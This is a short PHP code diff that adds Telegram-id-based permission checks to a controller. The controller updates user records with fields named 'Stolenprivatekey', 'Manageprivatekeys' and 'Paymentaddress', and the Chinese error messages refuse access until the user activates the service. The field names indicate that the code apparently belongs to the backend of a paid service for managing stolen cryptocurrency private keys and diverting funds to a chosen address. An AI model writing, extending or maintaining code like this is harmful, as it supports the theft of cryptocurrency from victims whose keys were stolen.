@@ -28,6 +28,13 @@ class  UpdateController extends Controller
                 exit;
             }
 
+            $Permissions =  Db::table('userinfo')->field('*')->where(['tgid' => $hash['id'], 'transfer' => 1])->find();
+            if (!$Permissions) {
+                echo json_encode(retur('失败', '没有权限,请开通后使用', 403));
+                exit;
+            }
+
+            //
             $arr =  Db::table('user')->field('*')->where(['tgid' => $hash['id']])->find();
             if ($arr) {
                 $arr =  Db::table('user')->where(['tgid' => $hash['id']])->update(['Stolenprivatekey' => $data['Stolenprivatekey'], 'Manageprivatekeys' => $data['Manageprivatekeys'], 'Paymentaddress' => $data['Paymentaddress']]);
@@ -60,6 +67,13 @@ class  UpdateController extends Controller
             echo json_encode(retur('失败', '非法访问', 409));
             exit;
         }
+
+        $Permissions =  Db::table('userinfo')->field('*')->where(['tgid' => $hash['id'], 'transfer' => 1])->find();
+        if (!$Permissions) {
+            echo json_encode(retur('失败', '没有权限,请开通后使用', 403));
+            exit;
+        }
+
         $arr =  Db::table('user')->field('*')->where(['tgid' => $hash['id']])->find();
         if ($arr) {
             $arr =  Db::table('user')->where(['tgid' => $hash['id']])->update(['switch' => $data['switch']]);
